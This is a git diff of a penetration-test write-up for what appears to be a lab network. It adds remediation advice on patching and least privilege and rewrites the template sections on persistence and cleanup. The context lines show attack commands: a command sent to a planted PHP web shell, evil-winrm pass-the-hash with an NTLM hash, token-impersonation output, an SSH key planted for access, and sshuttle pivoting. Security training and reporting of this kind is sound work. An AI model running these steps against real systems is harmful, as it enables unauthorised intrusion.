@@ -28,7 +28,7 @@ My objective is to evaluathe the overall security of the network, identify asset
 The the following IP was provided by the friend as initial access to this accessment:
     - **10.200.105.200**
 
-This first machine forwards the connection to a second machine, where a webserver has been hosted. 
+This first machine forwards the connection to a second machine, where a Git server has been hosted. 
 In this network there is also a personal computer of the friend.
 
 During this assessment we were able to access the server where the website is hosted by exploiting a kwown vulnerability of the webserver *MiniServ 1.890*. In this access, we discovered two other IPs within this network:
@@ -38,7 +38,11 @@ During this assessment we were able to access the server where the website is ho
 
 ## Recommendations
 
-<!-- write end up methodology -->
+The most important recommendation to these systems is a complete update of all existing application, even those who are are not constantly being used. A regular patch management prevents the exploitation of known vulnerabilities. In the present case, a patch management would prevent the first compromise of the webserver.
+
+In case all the system were updated, but an attacker would still be able to get foothold on the server through a zero-day vulnerability, the second line of defense would be to restrict the usage of administrative users (root or nt authority\system). The usage of administrative users should be restricted to essential and limited tasks. Normal access should be performed with users with less privilege as possible and necessary. Even those limited users must have their access and their possibilites restricited to their tasks, avoiding givem them access to files or functions that may allow a privilege escalation.
+
+It is also recommend to configure systems with minimal applications. The usage of minimal server, prevents the execution of applications that are not related to the finality of the system.
 
 
 ## Information Gathering
@@ -423,7 +427,6 @@ curl -X POST http://10.200.105.150/web/exploit-pat.php -d "a=ping -n 5 Attacking
 "
 Pinging Attacking-Machine with 32 bytes of data:
 
-
 Ping statistics for  Attacking-Machine:
     Packets: Sent = 5, Received = 0, Lost = 5 (100% loss),
 ```
@@ -488,6 +491,8 @@ Even without founding the password of the Administrator, it is still possible to
 evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.105.150
 ```
 
+
+
 676     {0;000003e7} 1 D 20119          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
  -> Impersonated !
  * Process Token : {0;0014b5a9} 2 F 2300470     GIT-SERV\patota S-1-5-21-3335744492-1614955177-2693036043-1002  (15g,24p)       Primary
@@ -509,40 +514,13 @@ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzSgdiWcVQdOVu6F49M2ghOS7g4Efw7HNE3w
 sshuttle -r root@10.200.105.200 --ssh-cmd "ssh -i id_rsa" 10.200.0.0/24 -x 10.200.105.200
 
 
-
 ## Maintaining Access
 
-Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
-The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
-Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.
+The steps described in the previous sessions allowed us to maintain access to the compromised services. This result can also be acquired with tools of Command of Control (i.e. empire).
+
+Since we are dealing with productive environment, the possibility and the methods were just described in this report. The actual executation were not performed to avoid any possobile damage on these systems.
 
 ## House Cleaning
 
-The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
-Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road.
-Ensuring that we are meticulous and no remnants of our penetration test are left over is important.
-
-After collecting trophies from the exam network was completed, I removed all user accounts and passwords as well as the Meterpreter services installed on the system.
-Offensive Security should not have to remove any user accounts or services from the system.
-
-# Additional Items
-
-## Appendix - Proof and Local Contents:
-
-IP (Hostname) | Local.txt Contents | Proof.txt Contents
---------------|--------------------|-------------------
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
-
-## Appendix - Metasploit/Meterpreter Usage
-
-For the exam, I used my Metasploit/Meterpreter allowance on the following machine: `192.168.x.x`
-
-## Appendix - Completed Buffer Overflow Code
-
-```
-code here
-```
+Once the engagement was concluded, we removed all applications and configurations we applied in the compromised systems.
+Since all configuration and tools were described in this document, the process of removing followed the narrative path.
